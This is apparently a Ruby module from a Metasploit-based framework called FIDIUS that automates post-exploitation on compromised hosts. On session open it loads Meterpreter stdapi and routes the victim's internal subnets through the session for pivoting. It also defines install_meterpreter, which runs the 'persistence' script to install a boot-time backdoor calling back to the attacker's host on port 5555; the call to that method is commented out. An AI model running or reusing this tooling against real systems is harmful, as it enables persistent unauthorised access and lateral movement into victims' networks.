module FIDIUS

module Session

  class MsfSessionEvent
    include ::Msf::SessionEvent

    def on_session_open(session)
      puts("on_session_open #{session}")
      FIDIUS::Session::session_action session
    end

    def on_session_close(session, reason='')
      puts("on_session_close #{session}")
    end

    def on_session_command(session, command)
      puts("on_session_command #{session} #{command}")
    end
  end

  def self.session_action session
    begin
      session.load_stdapi
      add_route_to_session session
#      install_meterpreter session
    rescue ::Exception
      puts "problem in session_action: #{$!} #{$!.backtrace}"
    end
  end

  def self.install_meterpreter session
    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
    rhost = FIDIUS::Session::get_rhost session
    lhost = Rex::Socket.source_address((rhost != nil and !rhost.empty?) ? rhost : "1.2.3.4");
    args = ['-X', '-p', '5555', '-r', lhost]
    puts "run: #{script_path} #{args}"
    session.execute_file(script_path, args)
  end

  def self.add_route_to_session session
    sb = Rex::Socket::SwitchBoard.instance
    session.net.config.each_route do |route|
      # Remove multicast and loopback interfaces
      next if route.subnet =~ /^(224\.|127\.)/
      next if route.subnet == '0.0.0.0'
      next if route.netmask == '255.255.255.255'
      next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new(FIDIUS::Session::get_rhost session)
      unless sb.route_exists?(route.subnet, route.netmask)
        puts "AutoAddRoute: Routing new subnet #{route.subnet}/#{route.netmask} through session #{session.sid}"
        sb.add_route(route.subnet, route.netmask, session)
      end
    end
  end

  def self.get_rhost session
    if session.respond_to? :target_host and session.target_host
      return session.target_host
    elsif session.respond_to? :tunnel_local and session.tunnel_local
      return session.tunnel_local[0, session.tunnel_local.rindex(":") || session.tunnel_local.length ]
    else
      puts("Session with no target_host or tunnel_local")
      return
    end
  end

end end
